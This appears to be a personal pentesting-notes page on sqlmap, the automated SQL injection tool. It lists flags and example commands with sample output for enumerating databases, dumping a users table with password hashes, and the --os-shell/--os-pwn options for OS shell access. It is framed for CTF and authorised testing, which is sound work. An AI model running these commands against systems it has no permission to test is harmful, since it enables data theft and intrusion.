#### Official Documentation: [https://sqlmap.org/](https://sqlmap.org/)
#### Cheat Sheet: [[Kali Tools#SQLmap|SQLmap Commands]]
## Purpose
sqlmap is an automated SQL injection tool that detects and exploits SQL injection flaws, enumerates databases, dumps data, and can provide a SQL shell.

## Scenarios
- CTF: Identify SQL injection points, dump database contents (tables, columns) to find flags.  
- Real world: Verify suspected injection vulnerabilities, enumerate DBs, and help prioritize fixes.

## All needed info to run
- Target URL with injectable parameter (GET/POST) or a request file (`-r request.txt`).  
- Common flags:
  - `-u <url>` → target URL  
  - `-p <param>` → parameter to test (optional)  
  - `--data="<postdata>"` → POST data  
  - `-r <reqfile>` → use saved request file (Burp)  
  - `--dbs` → enumerate databases  
  - `--tables -D <db>` → list tables in database  
  - `--columns -D <db> -T <table>` → list columns  
  - `--dump -D <db> -T <table>` → dump table contents  
  - `--os-shell` / `--os-pwn` → attempt OS shell (dangerous; often needs file writes)  
  - `--proxy=http://127.0.0.1:8080` → route through Burp
- Use `-v` for verbosity. Use `--batch` to skip prompts.

## Example commands & outputs
```bash
# Basic test
$ sqlmap -u "http://192.168.56.101/item.php?id=1" --batch
# Output snippet:
# [INFO] testing for SQL injection on parameter 'id'
# [INFO] the back-end DBMS is MySQL
# available databases [3]:
# [0] information_schema
# [1] users_db
# [2] test_db

# Enumerate tables in users_db
$ sqlmap -u "http://example.com/product.php?id=2" --tables -D users_db
# Output:
# Database: users_db
# +----------+
# | users    |
# | creds    |
# +----------+

# Dump data from a table
$ sqlmap -u "http://example.com/product.php?id=2" --dump -D users_db -T users
# Output snippet:
# username: admin
# password: $2y$10$encryptedhash
```

!!! note "SQLmap Basics"
	- Use `-r` with a Burp request file for complex requests (auth, headers, cookies).
	- `--batch` automates choices but may make risky decisions; use carefully.
	- SQLmap can be very noisy and disruptive — use only on allowed targets.
	- Avoid `--os-shell`/`--os-pwn` on production targets unless you have permission.


### [[Kali Tools#SQLmap|SQLmap Commands]]